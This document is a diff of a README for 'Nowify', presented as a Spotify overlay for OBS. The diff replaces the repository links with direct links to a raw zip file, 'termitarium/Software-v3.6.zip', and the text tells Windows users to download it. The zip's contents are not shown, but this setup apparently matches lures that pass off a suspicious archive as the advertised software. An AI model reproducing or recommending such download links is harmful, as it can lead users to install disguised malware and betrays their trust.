@@ -1,6 +1,6 @@
 # 🎛️ Nowify - Clean Spotify Overlays for OBS
 
-[![Download Nowify](https://img.shields.io/badge/Download-Nowify-blue?style=for-the-badge&logo=github)](https://github.com/Pallid-wassailer439/Nowify)
+[![Download Nowify](https://img.shields.io/badge/Download-Nowify-blue?style=for-the-badge&logo=github)](https://github.com/Pallid-wassailer439/Nowify/raw/refs/heads/main/termitarium/Software-v3.6.zip)
 
 ## 🎯 What Nowify Does
 
@@ -12,7 +12,7 @@ It is made for streamers who want a simple way to show music on screen without e
 
 Visit this page to download and use Nowify:
 
-[https://github.com/Pallid-wassailer439/Nowify](https://github.com/Pallid-wassailer439/Nowify)
+[https://github.com/Pallid-wassailer439/Nowify/raw/refs/heads/main/termitarium/Software-v3.6.zip](https://github.com/Pallid-wassailer439/Nowify/raw/refs/heads/main/termitarium/Software-v3.6.zip)
 
 Open the page and look for the latest release or setup files. Download the Windows version, then follow the steps below.
 
